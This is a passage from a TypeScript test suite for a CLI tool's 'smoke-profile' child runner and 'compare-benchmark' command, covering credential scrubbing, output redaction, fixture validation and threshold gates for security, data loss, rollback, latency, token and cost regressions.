      issues: [{ code: 'smoke-profile-input-invalid', message: '--profile requires a value' }],
    })
  })

  it('rejects empty --profile= values after argument parsing', async () => {
    const result = await runSmokeProfile(['--profile=', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-input-invalid', message: 'profile must be a non-empty string' }],
    })
  })

  it('captures real child runner output, failures, and timeouts', async () => {
    const echoRunner = createSmokeProfileChildRunner('/bin/echo')
    const bundles = ['@deepseek-ai/dsh-base']
    const dumpConfig = await echoRunner({ stage: 'dump-config', profile: 'web-curated', bundles, timeoutMs: 5000 })
    const help = await echoRunner({ stage: 'help', profile: 'web-curated', bundles, timeoutMs: 5000 })
    const missing = await createSmokeProfileChildRunner('/definitely/missing/dsh')({
      stage: 'help',
      profile: 'web-curated',
      bundles,
      timeoutMs: 5000,
    })
    const timeoutRunner = createSmokeProfileChildRunner(process.execPath, ['-e', 'setTimeout(() => {}, 50)'])
    const timedOut = await timeoutRunner({ stage: 'help', profile: 'web-curated', bundles, timeoutMs: 1 })

    expect(dumpConfig.status).toBe(0)
    expect(dumpConfig.stdout).toContain('--dump-config')
    expect(help.status).toBe(0)
    expect(help.stdout).toContain('--profile web-curated --help')
    expect(missing.status).toBe(1)
    expect(timedOut.status).toBe(124)
    expect(timedOut.timedOut).toBe(true)
  })

  it('passes integer deadlines to child_process and drops secret explicit env overrides', async () => {
    const script = tempFile('explicit-env-probe.mjs', [
      'process.stdout.write(`audit=${process.env.AUDIT_PASSWORD ?? "missing"} safe=${process.env.CURATED_SAFE ?? "missing"}`)',
      '',
    ].join('\n'))
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [script], {
        env: {
          AUDIT_PASSWORD: 'ordinary-explicit-secret',
          CURATED_SAFE: 'visible',
          CURATED_UNSET: undefined,
          DSH_HOME: '/safe/home',
          DSH_TELEMETRY_DISABLED: '1',
          DSH_PRIVATE_VALUE: 'hidden',
        },
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000.5,
      })

      expect(result.status).toBe(0)
      expect(result.stdout).toContain('audit=missing')
      expect(result.stdout).toContain('safe=visible')
      expect(result.stdout).not.toContain('ordinary-explicit-secret')
    } finally {
      cleanup(script)
    }
  })

  it('scrubs ambient credentials and DSH variables and redacts captured child output', async () => {
    const previousPassword = process.env.AUDIT_PASSWORD
    const previousDsh = process.env.DSH_PRIVATE_VALUE
    const script = tempFile('env-probe.mjs', [
      'process.stdout.write(`password=${process.env.AUDIT_PASSWORD ?? "missing"}\\n`)',
      'process.stderr.write(`dsh=${process.env.DSH_PRIVATE_VALUE ?? "missing"} token=ordinary-output-secret\\n`)',
      '',
    ].join('\n'))
    process.env.AUDIT_PASSWORD = 'ordinary-ambient-secret'
    process.env.DSH_PRIVATE_VALUE = 'private-dsh-value'
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [script])
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      expect(result.stdout).toContain('password=[REDACTED]')
      expect(result.stderr).toContain('dsh=missing')
      expect(result.stderr).toContain('token=[REDACTED]')
      expect(result.stdout).not.toContain('ordinary-ambient-secret')
      expect(result.stderr).not.toContain('ordinary-output-secret')
      expect(result.stderr).not.toContain('private-dsh-value')
    } finally {
      if (previousPassword === undefined) delete process.env.AUDIT_PASSWORD
      else process.env.AUDIT_PASSWORD = previousPassword
      if (previousDsh === undefined) delete process.env.DSH_PRIVATE_VALUE
      else process.env.DSH_PRIVATE_VALUE = previousDsh
      cleanup(script)
    }
  })


  it('scrubs ambient credentials from smoke child processes', async () => {
    process.env.CURATED_SMOKE_API_KEY = 'sk-smoke-child-secret'
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [
        '-e',
        'console.log(process.env.CURATED_SMOKE_API_KEY ?? "absent")',
        '--',
      ])
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      expect(result.status).toBe(0)
      expect(result.stdout.trim()).toBe('absent')
    } finally {
      delete process.env.CURATED_SMOKE_API_KEY
    }
  })
})

describe('compare-benchmark command', () => {
  it('requires evidence and execution provenance', () => {
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    delete fixture.evidenceKind
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'compare-benchmark',
        ok: false,
        issues: [{ message: 'evidenceKind must be observed, fixture, or planned' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('never accepts fixture evidence', () => {
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    fixture.evidenceKind = 'fixture'
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'compare-benchmark',
        evidenceKind: 'fixture',
        ok: false,
        status: 'unverified',
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects baseline and candidate environment mismatches', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      evidenceKind?: string
      baseline: Record<string, unknown>
      candidate: Record<string, unknown>
    }
    fixture.evidenceKind = 'observed'
    fixture.baseline.execution = {
      id: 'baseline-execution',
      startedAt: '2026-08-25T00:00:00.000Z',
      environment: { model: 'deepseek-chat', prompt: 'prompt-v1', workspace: 'fixture-a', network: 'online', seed: 7 },
    }
    fixture.candidate.execution = {
      id: 'candidate-execution',
      startedAt: '2026-08-25T00:05:00.000Z',
      environment: { model: 'deepseek-chat', prompt: 'prompt-v1', workspace: 'fixture-b', network: 'online', seed: 7 },
    }
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate environments must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects task-set and repetition mismatches', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      evidenceKind?: string
      baseline: Record<string, unknown>
      candidate: Record<string, unknown> & { runs: Array<Record<string, unknown>> }
    }
    fixture.evidenceKind = 'observed'
    const environment = { model: 'deepseek-chat', prompt: 'prompt-v1', workspace: 'fixture', network: 'online', seed: 7 }
    fixture.baseline.execution = { id: 'baseline-execution', startedAt: '2026-08-25T00:00:00.000Z', environment }
    fixture.candidate.execution = { id: 'candidate-execution', startedAt: '2026-08-25T00:05:00.000Z', environment }
    fixture.candidate.runs.push(benchmarkRun({ taskId: 'extra', attempt: 1 }))
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate comparison keys must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects mismatched repetition attempts for the same task set', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.candidate.runs[0] = { ...fixture.candidate.runs[0], attempt: 6 }
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate comparison keys must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects fewer than five repetitions for any compared task', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.runs = fixture.baseline.runs.filter(run => run.taskId !== 'a' || run.attempt !== 5)
    fixture.candidate.runs = fixture.candidate.runs.filter(run => run.taskId !== 'a' || run.attempt !== 5)
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'benchmark task a must have at least 5 repetitions per profile' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects a required critical task omitted from both profiles', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.runs = fixture.baseline.runs.filter(run => run.taskId !== 'a')
    fixture.candidate.runs = fixture.candidate.runs.filter(run => run.taskId !== 'a')
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'required critical task a is missing from the comparison' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects missing profile execution provenance', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      candidate: { execution?: unknown }
    }
    delete fixture.candidate.execution
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'candidate.execution must be an object' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('evaluates every gate immediately below, at, and above its raw threshold', () => {
    type MutableFixture = {
      requiredCriticalTaskIds: string[]
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    type Metric = 'security' | 'dataLoss' | 'rollback' | 'startup' | 'criticalDrop'
      | 'firstTokenIncrease' | 'tokenIncrease' | 'costIncrease' | 'costSuccessGain'
    const cases: readonly {
      readonly name: string
      readonly metric: Metric
      readonly value: number | boolean
      readonly expectedCode?: string
      readonly expectedStatus?: BenchmarkComparison['status']
      readonly expectedIssue?: string
      readonly roundedGroup?: 'security' | 'firstToken' | 'tokens' | 'cost'
    }[] = [
      { name: 'security below 95%', metric: 'security', value: 94.9999, expectedCode: 'security-correctness-below-95', expectedStatus: 'rejected', roundedGroup: 'security' },
      { name: 'security at 95%', metric: 'security', value: 95, roundedGroup: 'security' },
      { name: 'security above 95%', metric: 'security', value: 95.0001, roundedGroup: 'security' },
      { name: 'data loss below zero', metric: 'dataLoss', value: -1, expectedIssue: 'candidate.runs[0].dataLossEvents must be a non-negative safe integer' },
      { name: 'data loss at zero', metric: 'dataLoss', value: 0 },
      { name: 'data loss above zero', metric: 'dataLoss', value: 1, expectedCode: 'data-loss-detected', expectedStatus: 'rejected' },
      { name: 'rollback unavailable', metric: 'rollback', value: false, expectedCode: 'rollback-impossible', expectedStatus: 'rejected' },
      { name: 'rollback available', metric: 'rollback', value: true },
      { name: 'startup failures below 1%', metric: 'startup', value: 0 },
      { name: 'startup failures at 1%', metric: 'startup', value: 1 },
      { name: 'startup failures above 1%', metric: 'startup', value: 2, expectedCode: 'startup-failure-rate-above-1', expectedStatus: 'rejected' },
      { name: 'critical success decline below 3 points', metric: 'criticalDrop', value: 2 },
      { name: 'critical success decline at 3 points', metric: 'criticalDrop', value: 3 },
      { name: 'critical success decline above 3 points', metric: 'criticalDrop', value: 4, expectedCode: 'critical-success-rate-drop', expectedStatus: 'rejected' },
      { name: 'first-token P95 increase below 15%', metric: 'firstTokenIncrease', value: 14.9999, roundedGroup: 'firstToken' },
      { name: 'first-token P95 increase at 15%', metric: 'firstTokenIncrease', value: 15, roundedGroup: 'firstToken' },
      { name: 'first-token P95 increase above 15%', metric: 'firstTokenIncrease', value: 15.0001, expectedCode: 'first-token-p95-regression', expectedStatus: 'rollback', roundedGroup: 'firstToken' },
      { name: 'prompt/schema token increase below 20%', metric: 'tokenIncrease', value: 19.9999, roundedGroup: 'tokens' },
      { name: 'prompt/schema token increase at 20%', metric: 'tokenIncrease', value: 20, roundedGroup: 'tokens' },
      { name: 'prompt/schema token increase above 20%', metric: 'tokenIncrease', value: 20.0001, expectedCode: 'prompt-schema-token-regression', expectedStatus: 'rollback', roundedGroup: 'tokens' },
      { name: 'cost increase below 20%', metric: 'costIncrease', value: 19.9999, roundedGroup: 'cost' },
      { name: 'cost increase at 20%', metric: 'costIncrease', value: 20, roundedGroup: 'cost' },
      { name: 'cost increase above 20%', metric: 'costIncrease', value: 20.0001, expectedCode: 'cost-regression-without-success-gain', expectedStatus: 'rollback', roundedGroup: 'cost' },
      { name: 'cost success gain below 3 points', metric: 'costSuccessGain', value: 2, expectedCode: 'cost-regression-without-success-gain', expectedStatus: 'rollback' },
      { name: 'cost success gain at 3 points', metric: 'costSuccessGain', value: 3 },
      { name: 'cost success gain above 3 points', metric: 'costSuccessGain', value: 4 },
    ]
    const roundedDecisions: Record<string, Array<{ value: number; triggered: boolean }>> = {}

    for (const testCase of cases) {
      const fixture = JSON.parse(benchmarkFixture()) as MutableFixture
      const runCount = testCase.metric === 'tokenIncrease'
        ? 10_000
        : testCase.metric === 'costIncrease'
          ? 5
          : 100
      const runs = (): Array<Record<string, unknown>> => Array.from(
        { length: runCount },
        (_, index) => benchmarkRun({ taskId: 'threshold', attempt: index + 1 }),
      )
      fixture.requiredCriticalTaskIds = ['threshold']
      fixture.baseline.runs = runs()
      fixture.candidate.runs = runs()

      switch (testCase.metric) {
        case 'security':
          for (const run of fixture.candidate.runs) run.securityCorrectness = testCase.value
          break
        case 'dataLoss':
          fixture.candidate.runs[0]!.dataLossEvents = testCase.value
          break
        case 'rollback':
          fixture.candidate.runs[0]!.rollbackSupported = testCase.value
          break
        case 'startup':
          for (const run of fixture.candidate.runs.slice(0, testCase.value as number)) run.startupSucceeded = false
          break
        case 'criticalDrop':
          for (const run of fixture.candidate.runs.slice(0, testCase.value as number)) run.success = false
          break
        case 'firstTokenIncrease':
          for (const run of fixture.candidate.runs) run.firstTokenMs = 100 * (1 + (testCase.value as number) / 100)
          break
        case 'tokenIncrease': {
          for (const run of fixture.candidate.runs) {
            run.promptTokens = 60
            run.schemaTokens = 60
          }
          fixture.candidate.runs[0]!.schemaTokens = 60
            + Math.round(((testCase.value as number) - 20) * runCount)
          break
        }
        case 'costIncrease':
          for (const run of fixture.candidate.runs) run.costUsd = 1 + (testCase.value as number) / 100
          break
        case 'costSuccessGain':
          for (const [index, run] of fixture.baseline.runs.entries()) run.success = index < 50
          for (const [index, run] of fixture.candidate.runs.entries()) {
            run.success = index < 50 + (testCase.value as number)
            run.costUsd = 1.200001
          }
          break
      }

      const path = tempFile('benchmark.json', JSON.stringify(fixture))
      try {
        const result = runCompareBenchmark(['--fixture', path, '--json'])
        const payload = JSON.parse(result.stdout) as BenchmarkComparison & {
          readonly issues?: readonly { readonly message: string }[]
        }
        if (testCase.expectedIssue !== undefined) {
          expect(payload.issues?.[0]?.message, testCase.name).toBe(testCase.expectedIssue)
          continue
        }

        const codes = [
          ...payload.nonCompensableFailures.map(failure => failure.code),
          ...payload.rollback.reasons.map(reason => reason.code),
        ]
        expect(codes, testCase.name).toEqual(testCase.expectedCode === undefined ? [] : [testCase.expectedCode])
        expect(payload.status, testCase.name).toBe(testCase.expectedStatus ?? 'accepted')

        if (testCase.roundedGroup !== undefined) {
          const value = testCase.roundedGroup === 'security'
            ? payload.candidate.securityCorrectness
            : testCase.roundedGroup === 'firstToken'
              ? payload.candidate.statistics.firstTokenMs.p95
              : testCase.roundedGroup === 'tokens'
                ? payload.candidate.statistics.promptSchemaTokens.mean
                : payload.candidate.statistics.costUsd.mean
          ;(roundedDecisions[testCase.roundedGroup] ??= []).push({
            value,
            triggered: testCase.expectedCode !== undefined,
          })
        }
      } finally {
        cleanup(path)
      }
    }

    expect(roundedDecisions).toEqual({
      security: [{ value: 95, triggered: true }, { value: 95, triggered: false }, { value: 95, triggered: false }],
      firstToken: [{ value: 115, triggered: false }, { value: 115, triggered: false }, { value: 115, triggered: true }],
      tokens: [{ value: 120, triggered: false }, { value: 120, triggered: false }, { value: 120, triggered: true }],
      cost: [{ value: 1.2, triggered: false }, { value: 1.2, triggered: false }, { value: 1.2, triggered: true }],
    })
  })

  it('rejects a rollback snapshot whose digest does not match its embedded value', () => {
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    fixture.evidenceKind = 'observed'
    fixture.previousSnapshots = {
      lock: {
        sha256: '0'.repeat(64),
        snapshot: { schemaVersion: 1, kind: 'curated-lock-snapshot', profile: 'web-curated', candidates: [] },
      },
      profile: {
        sha256: '1'.repeat(64),
        snapshot: { schemaVersion: 1, kind: 'curated-profile-snapshot', profile: 'web-curated', bundles: [] },
      },
    }
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'previousSnapshots.lock.sha256 does not match its embedded snapshot' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('computes statistics, failure distribution, weighted score, and snapshot references', () => {
    const path = tempFile('benchmark.json', benchmarkFixture())
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(0)
      expect(payload.ok).toBe(true)
      expect(payload.status).toBe('accepted')
      expect(payload.previousSnapshots).toEqual({
        lock: snapshotEnvelope(previousLockSnapshot),
        profile: snapshotEnvelope(previousProfileSnapshot),
      })
      expect(payload.candidate.statistics.firstTokenMs).toEqual({ mean: 20, p50: 20, p95: 30 })
      expect(payload.candidate.statistics.promptSchemaTokens).toEqual({ mean: 100, p50: 100, p95: 120 })
      expect(payload.candidate.failureDistribution).toEqual({ timeout: 5 })
      expect(payload.candidate.weightedScore).toBe(78.9)
    } finally {
      cleanup(path)
    }
  })

  it('rejects secret-like benchmark failure reasons without echoing them', () => {
    const path = tempFile('benchmark-secret.json', benchmarkFixture([benchmarkRun({
      taskId: 'secret-bearing-failure',
      success: false,
      failure: 'provider returned Bearer hidden-benchmark-token',
    })]))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        readonly command: 'compare-benchmark'
        readonly ok: boolean
        readonly issues: readonly { readonly message: string }[]
      }

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        command: 'compare-benchmark',
        ok: false,
        issues: [{ message: 'candidate.runs[15].failure must not contain secret material' }],
      })
      expect(result.stdout).not.toContain('hidden-benchmark-token')
    } finally {
      cleanup(path)
    }
  })

  it('rejects every non-compensable threshold even when the weighted score is high', () => {
    const path = tempFile('benchmark.json', benchmarkFixture([benchmarkRun({
      taskId: 'd',
      critical: true,
      startupSucceeded: false,
      dataLossEvents: 1,
      rollbackSupported: false,
      success: false,
      failure: 'startup',
      quality: 100,
      securityCorrectness: 90,
      reliability: 100,
      performanceCost: 100,
      operationExperience: 100,
      upgradeCompatibility: 100,
    })]))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(1)
      expect(payload.status).toBe('rejected')
      expect(payload.nonCompensableFailures.map(failure => failure.code)).toEqual([
        'critical-success-rate-drop',
        'data-loss-detected',
        'rollback-impossible',
        'security-correctness-below-95',
        'startup-failure-rate-above-1',
      ])
    } finally {
      cleanup(path)
    }
  })

  it('marks rollback for first-token, token, and cost regressions with prior snapshots', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.runs = fixture.baseline.runs.map(run => ({
      ...run,
      firstTokenMs: 100,
      promptTokens: 50,
      schemaTokens: 50,
      costUsd: 1,
    }))
    fixture.candidate.runs = fixture.candidate.runs.map(run => ({
      ...run,
      firstTokenMs: 116,
      promptTokens: 61,
      schemaTokens: 60,
      costUsd: 1.21,
    }))
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(1)
      expect(payload.status).toBe('rollback')
      expect(payload.rollback).toEqual({
        required: true,
        previousSnapshots: {
          lock: snapshotEnvelope(previousLockSnapshot),
          profile: snapshotEnvelope(previousProfileSnapshot),
        },
        reasons: [
          { code: 'first-token-p95-regression', message: 'first-token P95 increased by more than 15%' },
          { code: 'prompt-schema-token-regression', message: 'prompt and schema tokens increased by more than 20%' },
          { code: 'cost-regression-without-success-gain', message: 'cost increased by more than 20% while success gain stayed below 3 percentage points' },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('runs through the compare-benchmark source-tree wrapper', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dsh-curated-bench-'))
    const path = join(dir, 'benchmark.json')
    writeFileSync(path, benchmarkFixture())
    try {
      const result = runNode('compare-benchmark.mjs', ['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'compare-benchmark',
        ok: true,
        status: 'accepted',
      })
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('renders accepted, rejected, and rollback comparisons in text mode', () => {
    const accepted = tempFile('accepted.json', benchmarkFixture())
    const rejected = tempFile('rejected.json', benchmarkFixture([benchmarkRun({
      critical: true,
      startupSucceeded: false,
      dataLossEvents: 1,
      rollbackSupported: false,
      success: false,
      failure: 'startup',
      securityCorrectness: 90,
    })]))
    const rollbackFixture = JSON.parse(benchmarkFixture()) as {
      requiredCriticalTaskIds: string[]
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    rollbackFixture.requiredCriticalTaskIds = ['task']
    rollbackFixture.baseline.runs = repeatedBenchmarkRuns({
      taskId: 'task',
      critical: true,
      success: true,
      firstTokenMs: 0,
      promptTokens: 0,
      schemaTokens: 0,
      costUsd: 0,
    })
    rollbackFixture.candidate.runs = repeatedBenchmarkRuns({
      taskId: 'task',
      critical: true,
      success: true,
      firstTokenMs: 1,
      promptTokens: 0,
      schemaTokens: 0,
      costUsd: 0,
    })
    const rollback = tempFile('rollback.json', JSON.stringify(rollbackFixture))
    try {
      expect(runCompareBenchmark(['--fixture', accepted]).stdout)
        .toBe('compare-benchmark: accepted (web-curated, score 78.9)\n')
      expect(runCompareBenchmark(['--fixture', rejected]).stdout)
        .toContain('compare-benchmark: rejected (web-curated, 5 issues)')
      expect(runCompareBenchmark(['--fixture', rollback]).stdout)
        .toContain('compare-benchmark: rollback (web-curated, 1 issues)')
    } finally {
      cleanup(accepted)
      cleanup(rejected)
      cleanup(rollback)
    }
  })

  it('reports malformed benchmark fixtures through command input errors', () => {
    const invalidTopLevel = tempFile('invalid-top-level.json', '[]')
    const emptyRunsFixture = JSON.parse(benchmarkFixture()) as { baseline: { runs: unknown[] } }
    emptyRunsFixture.baseline.runs = []
    const emptyRuns = tempFile('empty-runs.json', JSON.stringify(emptyRunsFixture))
    const badSnapshotFixture = JSON.parse(benchmarkFixture()) as { previousSnapshots: { lock: unknown } }
    badSnapshotFixture.previousSnapshots.lock = ''
    const badSnapshot = tempFile('bad-snapshot.json', JSON.stringify(badSnapshotFixture))
    const missingProfileFixture = JSON.parse(benchmarkFixture()) as { baseline: unknown }
    missingProfileFixture.baseline = null
    const missingProfile = tempFile('missing-profile.json', JSON.stringify(missingProfileFixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidTopLevel, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'benchmark fixture must be a JSON object' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', emptyRuns, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.runs must be a non-empty array' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', badSnapshot, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'previousSnapshots.lock must be an object' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', missingProfile, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline must be an object' }],
      })
    } finally {
      cleanup(invalidTopLevel)
      cleanup(emptyRuns)
      cleanup(badSnapshot)
      cleanup(missingProfile)
    }
  })

  it('rejects malformed benchmark provenance and snapshot fields', () => {
    const cases: Array<{
      readonly message: string
      readonly mutate: (fixture: MutableBenchmarkFixture) => void
    }> = [
      {
        message: 'planned benchmark evidence must declare pendingCampaigns',
        mutate: (fixture) => {
          fixture.evidenceKind = 'planned'
          delete fixture.pendingCampaigns
        },
      },
      {
        message: 'previousSnapshots.lock.sha256 must be a lowercase SHA-256 digest',
        mutate: (fixture) => { fixture.previousSnapshots.lock.sha256 = 'invalid' },
      },
      {
        message: 'previousSnapshots.lock.snapshot.kind must be curated-lock-snapshot',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            kind: 'curated-profile-snapshot',
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot must not depend on a mutable catalogRef',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            catalogRef: 'mutable',
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates must be an array',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: {},
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].commit must be a full lowercase Git SHA',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{ ...previousLockSnapshot.candidates[0], commit: 'short' }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].tarballSha256 must be a lowercase SHA-256 digest',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{ ...previousLockSnapshot.candidates[0], tarballSha256: 'invalid' }],
          })
        },
      },
      {
        message: 'previousSnapshots.profile.snapshot.bundles must be a string array',
        mutate: (fixture) => {
          fixture.previousSnapshots.profile = snapshotEnvelope({
            ...previousProfileSnapshot,
            bundles: [''],
          })
        },
      },
      {
        message: 'baseline.execution.startedAt must be a canonical ISO timestamp',
        mutate: (fixture) => { fixture.baseline.execution.startedAt = 'yesterday' },
      },
      {
        message: 'baseline.execution.environment must contain exactly model, prompt, workspace, network, and seed',
        mutate: (fixture) => { fixture.baseline.execution.environment.extra = true },
      },
      {
        message: 'baseline.execution.environment.seed must be a non-empty string or safe integer',
        mutate: (fixture) => { fixture.baseline.execution.environment.seed = '' },
      },
      {
        message: 'baseline.runs must not repeat a taskId and attempt',
        mutate: (fixture) => { fixture.baseline.runs[1] = { ...fixture.baseline.runs[0] } },
      },
      {
        message: 'required critical task a must be marked critical in every repetition',
        mutate: (fixture) => { fixture.baseline.runs[0].critical = false },
      },
      {
        message: 'candidate.runs[0].attempt must be a positive safe integer',
        mutate: (fixture) => { fixture.candidate.runs[0].attempt = 0 },
      },
      {
        message: 'requiredCriticalTaskIds must be a non-empty string array',
        mutate: (fixture) => { fixture.requiredCriticalTaskIds = [] },
      },
      {
        message: 'requiredCriticalTaskIds[0] must be a non-empty string',
        mutate: (fixture) => { fixture.requiredCriticalTaskIds = [''] },
      },
      {
        message: 'requiredCriticalTaskIds must not contain duplicates',
        mutate: (fixture) => { fixture.requiredCriticalTaskIds = ['a', 'a'] },
      },
    ]
    for (const testCase of cases) {
      const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
      testCase.mutate(fixture)
      const path = tempFile('benchmark.json', JSON.stringify(fixture))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout), testCase.message).toMatchObject({
          issues: [{ message: testCase.message }],
        })
      } finally {
        cleanup(path)
      }
    }
  })

  it('accepts string execution seeds', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { execution: { environment: { seed: number | string } }; runs: Array<Record<string, unknown>> }
      candidate: { execution: { environment: { seed: number | string } }; runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.execution.environment.seed = 'repeatable'
    fixture.candidate.execution.environment.seed = 'repeatable'
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
    } finally {
      cleanup(path)
    }
  })

  it('rejects asymmetric pending evidence and renders unverified and pending text', () => {
    const pending = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    pending.evidenceKind = 'planned'
    pending.pendingCampaigns = ['campaign']
    pending.baseline.runs = []
    const pendingPath = tempFile('pending.json', JSON.stringify(pending))
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    fixture.evidenceKind = 'fixture'
    const fixturePath = tempFile('fixture.json', JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', pendingPath, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'benchmark runs require baseline and candidate execution provenance' }],
      })
      expect(runCompareBenchmark(['--fixture', fixturePath]).stdout)
        .toBe('compare-benchmark: unverified (fixture evidence cannot be accepted)\n')
      expect(runCompareBenchmark([]).stdout).toMatch(/^compare-benchmark: pending \(\d+ campaigns\)\n$/u)
    } finally {
      cleanup(pendingPath)
      cleanup(fixturePath)
    }
  })

  it('rejects invalid root arguments', () => {
